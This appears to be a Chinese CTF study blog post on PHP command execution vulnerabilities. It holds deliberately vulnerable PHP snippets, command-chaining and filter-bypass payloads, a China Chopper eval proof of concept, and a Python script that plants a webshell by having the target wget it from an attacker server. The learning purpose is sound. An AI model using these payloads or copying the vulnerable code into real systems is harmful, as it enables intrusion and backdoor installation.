---
layout:     post
title:      Web笔记（九）命令执行漏洞
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是学习代码命令执行漏洞，以及常用的命令执行语句。
date:       2020-12-02
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - 命令执行
---



## 0x00 命令执行漏洞简介

命令执行漏洞，是指Web应用程序接收用户输入，拼接到要执行的系统命令中执行。

其产生原因：

- 用户输入未过滤或净化（净化就是对特殊字符做处理如转义，然后再执行命令）。
- 拼接到系统命令中执行。



## 0x01 PHP下命令执行函数

#### 1. 代码执行函数

- eval
- assert

#### 2. 执行系统命令的函数

- system：执行一个外部的应用程序并显示输出的结果

- exec：执行一个外部的应用程序

- shell_exec：执行shell命令并返回输出的结果的字符串

- passthru：执行一个UNIX系统命令并显示原始的输出

- ``：与shell_exec函数的功能相同

- popen：与shell_exec函数功能类似，popen('[系统命令]', 'r')，'r'表示返回stdout文件指针，'w'表示返回stdin文件指针
```php
<?php
$handle = popen('/path/to/executable 2>&1', 'r');
echo "'$handle'; " . gettype($handle) . "\n";
$read = fread($handle, 2096);
echo $read;
pclose($handle);
?>
```

- proc_popen
- pcntl_exec
- $(xxx)：在bash中用来做命令替换的，可以当做shell命令执行，但不是所有shell都支持。



## 0x02 命令执行漏洞代码
```
<?php
echo "<pre>";
if(isset($_GET["cmd"])){
system($_GET["cmd"]);
}
echo "</pre>";
?>
```

直接链接加参数即可：http://ip地址/?cmd=ipconfig



## 0x03 Windows下命令执行漏洞分析

以下使用PHP代码，对指定目标执行Ping命令
```php
<?php
echo "<pre>";$arg = $_GT["cmd"];
if($arg){
	system("ping $arg");
}
echo "</pre>";?>
```

代码中拼接用户的输入进system函数执行，但是无法直接执行用户的自定义命令。

思路：截断输入，重新拼接，两条命令都输入并执行。

在Windows系统下的cmd命令，有以下一些截断拼接符：
- & 前面的语句为假则直接执行后面的
- && 前面的语句为假则直接出错，后面的也不执行
- \| 直接执行后面的语句
- \|\| 前面的出错执行后面的

例如正常情况下：ping 127.0.0.1恶意攻击：

- ping 111 & ipconfig
- ping 127.0.0.1 && ipconfig
- ping 127.0.0.1 \| ipconfig
- ping 111 \|\| ipconfig
  攻击链接为：http://ip/?cmd=111&ipconfig



## 0x04 Linux下命令执行漏洞分析

以下使用PHP代码，对指定目标执行Ping命令
```php
<?php
echo "<pre>";
$arg = $_GET["cmd"];
if($arg){
    system("ping -c 4 $arg");
}
echo "</pre>";
?>
```

在kali linux中启动Apache服务，输入`service apache2 start`然后将上述代码放在/var/www/html/下的cmd.php中。

在Linux系统下的shell命令，有以下一些截断拼接符：

- ;    前面的执行完执行后面的
- \|    是管道符，显示后面的执行结果
- \|\|    前面的出错时执行后面的
- &    无论前面是真是假都会执行
- &&    只有前面语句为真，才会执行后面语句

例：使用拼接符从而利用命令执行漏洞执行ifconfig命令http://ip/cmd.php?cmd=127.0.0.1;ifconfig



## 0x05 ``反引号执行

在PHP中，除了函数可以执行系统命令，反引号`也可以作为系统命令执行来使用。`
```php
<?php
echo "<pre>";
if(isset($_GET["cmd"])){
    $cmd = $_GET["cmd"];
    echo `$cmd`;
}
echo "</pre>";
?>
```

输入http://ip/cmd.php?cmd=ipconfig进行攻击。



## 0x06 eval函数

eval()函数把字符串按照PHP代码来计算。该字符串必须是合法的PHP代码，且必须以分号结尾。

如果没有在代码字符串中调用return语句，则返回NULL。

如果代码中存在解析错误，则eval()函数返回false。
```php
<?php
    eval("echo hello;");
?> 
```



## 0x07 菜刀连接

利用菜刀连接命令执行的位置，也被称为代码执行。POC：

/search.php?searchtype=5&tid=&area=eval($_POST[cmd])



## 0x08 动态代码执行
```php
<?php
$a=$_GET['a'];
$b=$_GET['b'];
$a($b);
?>
```

访问链接进行攻击：http://127.0.0.1/x.php?a=system&b=ipconfig 



## 0x09 防御

- escapeshellcmd

escapeshellcmd()函数在以下字符之前插入反斜杠：\&\#;\`\|\*?~<>^()[]{}$\\, \\x0A 和 \\xFF。 ' 和 " 仅在不配对的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。



## 0x0a 相关知识

#### 1. ()和{}

把几个命令合在一起执行，shell中有两种方法：

- (command1;command2;command3;...)

- { command1;command2;command3;...command;}

注意使用{}时第一条命令必须与左边括号有一个空格，最后一条命令一定要有分号。

并且()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令。

不同点是：()是重新开一个子shell执行命令，{}在当前shell执行。
```
cat ./fl{a,b,c,d}g
```

#### 2. shell输入输出重定向

参考菜鸟教程：

大多数 UNIX 系统命令从终端接受输入并将所产生的输出发送回到终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。

命令说明：

- command \> file：输出重定向到file。
- command \< file：输入重定向到file。
- command \>\> file：输出以追加的方式重定向到file。
- n \> file：将文件描述符为n的文件重定向到file。
- n \>\> file：将文件描述符为n的文件以追加的方式重定向到file。
- n \>& m：将输出文件m和n合并。
- n \<& m：将输入文件m和n合并。
- \<\< tag：将开始标记tag和结束标记tag之间的内容作为输入。

此外，文件描述符通常是这样的：

- 0：标准输入（STDIN）
- 1：标准输出（STDOUT）
- 2：标准错误输出（STDERR）

#### 3. 正则

- ^：匹配输入字符串的开始位置
- \$：匹配输入字符串的结束位置
- \*：匹配前面的子表达式零次或多次
- +：匹配前面的子表达式一次或多次
- ?：匹配前面的子表达式零次或一次
- {n}：n是一个非负整数，匹配确定的n次
- {n,}：n是一个非负整数，至少匹配n次
- {n,m}：m、n均是非负整数，并且n<=m，最少匹配n次，最多匹配m次
- .：匹配除换行符（\\n，\\r）以外的任何单个字符
- [xyz]：字符集合，匹配所有包含的任意一个字符
- 非贪婪?：当?紧跟在任何一个其他限制符(\*，+，?，,{n}，{n,}，{n,m})后面时，匹配是非贪婪的，非贪婪模式是指尽可能少地去匹配。
```
cat ./fl[a-z]g
cat ./fl*g
cat ./fl?g
```

{xxx}和[xxx]有个重要区别，如果匹配的文件不存在，[xxx]会失去模式的功能，变成一个单纯的字符串，而{xxx}还是可以展开。
```
cat ./fl[a-z]g	# 得到结果就只有存在的文件

cat ./fl{a,b,c}g 
# 得到的结果是每一个都会去尝试打开，但是不存在的会提示
cat: ./flbg: No such file or directory
```

#### 4. 内置通用字符簇

也是shell正则的知识

- [[:alpha:]]：任何字母
- [[:digit:]]：任何数字
- [[:alnum:]]：任何字母和数字
- [[:space:]]：任何空白字符
- [[:upper:]]：任何大写字母
- [[:lower:]]：任何小写字母
- [[:punct:]]：任何标点符号
- [[:xdigit:]]：任何16进制的数字，相当于[0-9a-fA-F]



## 0x0b 绕过

#### 1. 空格绕过

- \<\>
```
cat<>./flag
```

- $IFS（IFS的默认值是空白，也包括空格，tab，新行）
```
cat$IFS./flag
```

#### 2. 关键词绕过

- $
```
ca$*t ./flag
ca$@t ./flag
ca$2t ./flag
ca${11}t ./flag 
```

- 反斜杠
```
ca\t ./flag
```

- 变量
```
# 变量拼接
a=ca;b=t;c=./flag
$a$b $c

# 利用切割字符串拼凑
a="llxss";b=${a:0:1}${a:4:1};$b
```

- 特殊变量${9}，相当于空字符串
```
ca${9}t ./flag
```

- base64编码
```
echo "Y2F0IC4vZmxhZwo=" |base64 -d|bash
```

- 16进制
```
echo "0x636174202e2f666c6167" |xxd -r -p|bash
```

- 8进制
```
$(printf "\143\141\164\40\56\57\146\154\141\147")
```

- 使用双引号和单引号
```
ca"t" ./flag
ca't' ./flag
```

- 花括号
```
{cat,./flag}
```

- %0a(\\n)，%0d(\\r)，%09(\\t)等也可以绕过一些过滤

#### 3. 长度限制绕过

- 嵌套eval
```php
<?php
    $p = $_GET['p'];
	if(strlen($p) < 17){
        eval($p);
    }
?>   
```

可以嵌套一层eval，构造以下链接：

http://127.0.0.1/x.php?p=eval($_GET[x])&x=echo \`cat /flag\`;

- 重定向到文件
```php
<?php
    if(strlen($_POST['p'])<8){
    	echo shell_exec($_POST['p']);
    }
?>
```

这里需要利用重定向文件：n \> file指令是将文件描述符为n的文件重定向到file。由于受字数限制，需要分多次执行。

举个例子，如果我们要执行`echo 1`这条指令，那我们需要分段，转义，然后倒序输进去：
```
>\ 1\\
>echo\\
ls -t>a
```

原理是输入这些命令后，通过ls命令按照时间逆序(-t)列举出来，然后导入到文件a中去，导入后`cat a`可以看a文件的内容为：
```
echo\
 1\
```

利用这个留后门，也就是写shell的时候，直接写入shell的话可能需要各种转义，因为很多符号在php函数中会被执行，比较麻烦。可以考虑写入curl或wget指令让靶机向我们自己的服务器下载shell文件。如下，依次执行：
```
>php\\
>\\ 1.\\\\
>\\ -O\\\\
>.cn\\\\
>\\ xx\\\\
>wget\\\\
ls -t>a
sh a
```

相当于执行了wget xx.cn -O 1.php，从xx.cn网站处下载保存成1.php文件。可以修改靶机hosts文件使xx.cn指向自己的服务器IP。

还可以写一个利用命令执行漏洞写后门的自动化脚本（POST型）：
```python
import requests
cmd_list = [">php\\",">\\ 1.\\\\",">\\ -O\\\\",">.cn\\\\",">\\ xx\\\\",">wget\\\\"]
url = "http://xxx.com/xxx.php"	# 修改为靶机命令执行漏洞链接
url2 = "http://xxx.com/1.php"	# 修改即将为靶机新创建的shell链接
post_key = 'p'	# 产生命令执行漏洞的POST处的参数名称
for cmd in cmd_list:
    param = {post_key:cmd}
    requests.get(url, params=param)
param = {post_key:'ls -t>a'}
requests.get(url, params=param)
param = {post_key:'sh a'}
requests.get(url, params=param)
res = requests.get(url2)
if res.status_code == '200':
    print("success")
else:
    print("failed")

```

记得先在自己的服务器上（或者本地攻击机上）起一个http服务，如python3开http服务：

python -m http.server 4444

然后放一个一句话shell文件即可。

#### 4. 内联命令绕过关键词

可以使用反引号ls的输出作为cat的输入来绕过文件关键词。

```shell
ping 127.0.0.1;cat${IFS}$9`ls`
```



## 0xff commix工具

commix是一个使用python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接导入burp的历史记录进行检测，大大提高了易用性。

项目地址：https://github.com/stasinopoulos/commix 	Kali Linux自带了。

- commix -h 获取帮助信息
- commix -u http://ip/cmd.php?cmd=127.0.0.1  对目标进行测试

